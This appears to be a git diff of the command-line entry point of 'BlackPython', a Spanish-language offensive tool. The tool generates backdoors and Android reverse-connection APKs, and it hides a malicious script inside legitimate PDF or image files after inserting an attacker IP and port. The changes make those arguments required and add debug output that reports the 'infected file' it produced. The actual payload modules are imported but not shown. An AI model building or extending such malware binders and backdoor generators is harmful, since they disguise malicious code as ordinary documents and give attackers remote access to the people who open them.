@@ -2,10 +2,11 @@ from core.backdoor import Backdoor
 from core.android import AndroidPayload
 from core.binder import FileBinder
 import argparse
+import sys
 
 def main():
     parser = argparse.ArgumentParser(description="BlackPython - Herramienta de Red Team")
-    subparsers = parser.add_subparsers(dest="command")
+    subparsers = parser.add_subparsers(dest="command", required=True)
 
     # Backdoor
     backdoor_parser = subparsers.add_parser("backdoor", help="Genera un backdoor")
@@ -17,13 +18,14 @@ def main():
     android_parser.add_argument("--lhost", required=True, help="Host para conexión reversa")
     android_parser.add_argument("--lport", type=int, default=4444, help="Puerto para conexión")
 
-    # Binder (Modificado para aceptar IP/Puerto)
+    # Binder mejorado
     binder_parser = subparsers.add_parser("bind", help="Camufla un payload en un archivo")
     binder_parser.add_argument("--file", required=True, help="Archivo legítimo (PDF, PNG, JPG)")
     binder_parser.add_argument("--payload", required=True, help="Script malicioso a incrustar")
     binder_parser.add_argument("--output", required=True, help="Archivo de salida")
-    binder_parser.add_argument("--ip", help="IP para reemplazar en el payload")
-    binder_parser.add_argument("--port", type=int, help="Puerto para reemplazar en el payload")
+    binder_parser.add_argument("--ip", required=True, help="IP para reemplazar en el payload")
+    binder_parser.add_argument("--port", type=int, required=True, help="Puerto para reemplazar en el payload")
+    binder_parser.add_argument("--debug", action="store_true", help="Modo verbose")
 
     args = parser.parse_args()
 
@@ -32,17 +34,38 @@ def main():
     elif args.command == "android":
         AndroidPayload(args.lhost, args.lport).generate_apk()
     elif args.command == "bind":
-        # Lee y modifica el payload con la IP/Puerto
-        payload_content = open(args.payload).read()
-        if args.ip:
+        try:
+            if args.debug:
+                print(f"[DEBUG] Leyendo payload desde: {args.payload}")
+                
+            with open(args.payload, 'r') as f:
+                payload_content = f.read()
+                
             payload_content = payload_content.replace("TU_IP_AQUÍ", args.ip)
-        if args.port:
             payload_content = payload_content.replace("4444", str(args.port))
-        
-        if args.file.endswith(".pdf"):
-            FileBinder.bind_to_pdf(args.file, payload_content, args.output)
-        elif args.file.endswith((".png", ".jpg")):
-            FileBinder.bind_to_image(args.file, payload_content, args.output)
+
+            if args.debug:
+                print(f"[DEBUG] Payload modificado (primeras 100 chars):\n{payload_content[:100]}...")
+                print(f"[DEBUG] Tipo de archivo de entrada: {args.file.split('.')[-1]}")
+
+            if args.file.endswith(".pdf"):
+                FileBinder.bind_to_pdf(args.file, payload_content, args.output, args.debug)
+            elif args.file.endswith((".png", ".jpg")):
+                FileBinder.bind_to_image(args.file, payload_content, args.output, args.debug)
+            else:
+                raise ValueError("Formato de archivo no soportado")
+
+            if args.debug:
+                print(f"[SUCCESS] Archivo infectado creado en: {args.output}")
+                print(f"Tamaño original: {os.path.getsize(args.file)} bytes")
+                print(f"Tamaño infectado: {os.path.getsize(args.output)} bytes")
+
+        except Exception as e:
+            print(f"[ERROR] {str(e)}", file=sys.stderr)
+            if args.debug:
+                import traceback
+                traceback.print_exc()
+            sys.exit(1)
 
 if __name__ == "__main__":
     main()
